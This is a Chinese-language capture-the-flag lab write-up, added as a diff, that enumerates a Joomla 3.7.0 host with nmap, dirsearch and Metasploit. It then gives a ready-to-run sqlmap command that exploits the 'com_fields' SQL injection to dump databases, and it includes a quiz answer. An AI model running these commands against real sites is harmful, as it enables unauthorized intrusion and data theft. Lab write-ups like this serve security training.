@@ -1,0 +1,142 @@
+#服务枚举
+```
+┌──(root💀kali)-[~/tryhackme]
+└─# nmap -sV 10.10.36.72 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 05:45 EDT
+Nmap scan report for 10.10.36.72
+Host is up (0.34s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+3306/tcp open  mysql   MariaDB (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.94 seconds
+```
+
+#目录爆破
+```
+──(root💀kali)-[~/dirsearch]
+└─# python3 dirsearch.py -u "http://10.10.36.72" -e* -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -t 100
+
+ _|. _ _  _  _  _ _|_    v0.3.8
+(_||| _) (/_(_|| (_| )
+
+Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521
+
+Error Log: /root/dirsearch/logs/errors-21-09-02_05-48-23.log
+
+Target: http://10.10.36.72
+
+[05:48:23] Starting: 
+[05:48:25] 200 -    9KB - /
+[05:48:25] 301 -  234B  - /images  ->  http://10.10.36.72/images/
+[05:48:26] 301 -  235B  - /modules  ->  http://10.10.36.72/modules/
+[05:48:31] 301 -  237B  - /templates  ->  http://10.10.36.72/templates/
+[05:48:31] 301 -  233B  - /media  ->  http://10.10.36.72/media/
+[05:48:31] 301 -  231B  - /bin  ->  http://10.10.36.72/bin/
+[05:48:31] 301 -  235B  - /plugins  ->  http://10.10.36.72/plugins/
+[05:48:32] 301 -  236B  - /includes  ->  http://10.10.36.72/includes/
+[05:48:33] 301 -  236B  - /language  ->  http://10.10.36.72/language/
+[05:48:33] 301 -  238B  - /components  ->  http://10.10.36.72/components/
+[05:48:33] 301 -  233B  - /cache  ->  http://10.10.36.72/cache/
+[05:48:34] 301 -  237B  - /libraries  ->  http://10.10.36.72/libraries/
+[05:48:41] 301 -  231B  - /tmp  ->  http://10.10.36.72/tmp/
+[05:48:42] 301 -  235B  - /layouts  ->  http://10.10.36.72/layouts/
+[05:48:49] 301 -  241B  - /administrator  ->  http://10.10.36.72/administrator/
+[05:49:43] 301 -  231B  - /cli  ->  http://10.10.36.72/cli/
+                                                                                                                                                                                                
+Task Completed
+
+```
+
+
+#存在robots.txt文件，泄露相关文件夹，与爆破出来的基本一致
+```
+# If the Joomla site is installed within a folder 
+# eg www.example.com/joomla/ then the robots.txt file 
+# MUST be moved to the site root 
+# eg www.example.com/robots.txt
+# AND the joomla folder name MUST be prefixed to all of the
+# paths. 
+# eg the Disallow rule for the /administrator/ folder MUST 
+# be changed to read 
+# Disallow: /joomla/administrator/
+#
+# For more information about the robots.txt standard, see:
+# http://www.robotstxt.org/orig.html
+#
+# For syntax checking, see:
+# http://tool.motoricerca.info/robots-checker.phtml
+
+User-agent: *
+Disallow: /administrator/
+Disallow: /bin/
+Disallow: /cache/
+Disallow: /cli/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /layouts/
+Disallow: /libraries/
+Disallow: /logs/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /tmp/
+```
+
+#用msf探测版本
+```
+──(root💀kali)-[~]
+└─# msfconsole -q                                                                                                                                                                                                                       1 ⨯
+msf6 > use auxiliary/scanner/http/joomla_version
+msf6 auxiliary(scanner/http/joomla_version) > options
+
+Module options (auxiliary/scanner/http/joomla_version):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the Joomla application
+   THREADS    1                yes       The number of concurrent threads (max one per host)
+   VHOST                       no        HTTP server virtual host
+
+msf6 auxiliary(scanner/http/joomla_version) > set rhosts 10.10.36.72
+rhosts => 10.10.36.72
+msf6 auxiliary(scanner/http/joomla_version) > run
+
+[*] Server: Apache/2.4.6 (CentOS) PHP/5.6.40
+[+] Joomla version: 3.7.0
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+#得到cms版本
+Joomla version: 3.7.0
+
+```
+question：What is the Joomla version?
+answer:3.7.0
+```
+
+#查询cms漏洞,存在sql注入
+```
+┌──(root💀kali)-[~]
+└─# searchsploit Joomla 3.7.0                                                                                                                                                                                                         130 ⨯
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                                                                                | php/webapps/42033.txt
+Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                                                                                                             | php/webapps/43488.txt
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+#根据42033.txt，使用sqlmap注入
+
+sqlmap -u "http://10.10.36.72/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --dump --batch
